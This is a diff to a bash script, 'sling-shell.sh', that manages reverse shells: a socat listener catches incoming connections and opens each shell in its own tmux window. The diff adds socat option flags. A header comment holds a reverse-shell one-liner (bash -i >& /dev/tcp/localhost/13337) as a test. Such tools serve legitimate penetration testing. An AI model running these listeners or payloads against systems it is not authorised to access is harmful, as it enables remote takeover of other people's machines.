@@ -1,6 +1,7 @@
 #!/bin/bash
 #
 # tmux-based reverse shell manager.
+#
 # Prerequisites must be in $PATH:
 #   - sling-input
 #   - sling-watch
@@ -10,7 +11,7 @@
 #
 #
 # Usage:
-#   sling-shell.sh [-s session_name] [-p port]
+#   sling-shell.sh -h
 #
 # Test with:
 #   $ bash -c "bash -i >& /dev/tcp/localhost/13337 0>&1 &"
@@ -20,6 +21,7 @@ set -e
 # defaults
 SESSION=shell
 PORT=13337
+SOCAT_EXTRA=
 
 main() {
   if tmux has-session -t "$SESSION" 2>/dev/null; then
@@ -40,12 +42,12 @@ die() {
 
 usage() {
   (
-    echo "usage: $0 [-s session_name] [-p port]"
+    echo "usage: $0 [-r] [-p port] [-s session_name] [-x socat_opts_stdio]"
     echo ""
-    echo "  current settings:"
-    echo "    -s $SESSION"
-    echo "    -p $PORT"
-    echo ""
+    echo "  -p port  Port number ($PORT)"
+    echo "  -r       Raw output convenience option [equiv: \"-x raw,echo=0\"]"
+    echo "  -s name  Session name ($SESSION)"
+    echo "  -x str   Extra opts to pass to socat on STDIO side ($SOCAT_EXTRA)"
   ) 1>&2
   exit 1
 }
@@ -64,18 +66,29 @@ verify_prerequisites() {
   fi
 }
 
+socat_add_extra() {
+  local extra="$1"
+  SOCAT_EXTRA="${SOCAT_EXTRA:+$SOCAT_EXTRA,}$extra"
+}
+
 process_options() {
   local need_help=0
-  while getopts ":hp:s:" opt; do
+  while getopts ":hp:rs:x:" opt; do
     case "$opt" in
-      s)
-	SESSION="$OPTARG"
+      h)
+	need_help=1
 	;;
       p)
 	PORT="$OPTARG"
 	;;
-      h)
-	need_help=1
+      r)
+	socat_add_extra "raw,echo=0"
+	;;
+      s)
+	SESSION="$OPTARG"
+	;;
+      x)
+	socat_add_extra "$OPTARG"
 	;;
       \?)
 	die "unknown option: -$OPTARG (see -h for usage)"
@@ -104,16 +117,24 @@ bg_spawn() {
   # including cleanup -- with one script.
   export SLING_SESSION="$SESSION"
   export SLING_PORT="$PORT"
+  export SLING_SOCAT_EXTRA=
+  if [[ ! -z "$SOCAT_EXTRA" ]]; then
+    SLING_SOCAT_EXTRA=",$SOCAT_EXTRA"
+  fi
+
+  # TODO: sling/watch/catch a different socket directory per port
+
+  # TODO: maybe do something to automatically set COLUMNS and LINES
 
   # background content: watch for new sockets and open windows with them.
   local bgcontent='sling-watch |while read sock; do
     echo "new sling socket: $sock";
-    tmux new-window -t "$SLING_SESSION" -n "" -d -- sling-catch -c -N -s "$sock" -- socat FD:5 STDIO;
+    tmux new-window -t "'"$SLING_SESSION"'" -n "" -d -- sling-catch -c -N -s "$sock" -- socat FD:5 STDIO'"$SLING_SOCAT_EXTRA"';
   done'
   # foreground content: socat listener, spawn sling-input
-  local fgcontent='socat -d -d TCP4-LISTEN:$SLING_PORT,fork,reuseaddr EXEC:sling-input,nofork'
+  local fgcontent='socat -d -d TCP4-LISTEN:'"$SLING_PORT"',fork,reuseaddr EXEC:sling-input,nofork'
 
-  tmux new-session -s "$SESSION" -d -- bash -c \
+  tmux new-session -s "$SLING_SESSION" -d -- bash -c \
     "trap 'echo \"cleaning up...\"; kill \$(jobs -p) 2>&-; echo \"[press return to end window]\"; read _' EXIT; $bgcontent & $fgcontent"
   #\; set remain-on-exit off   # <-- manually waiting for input is functionally superior to this
 }
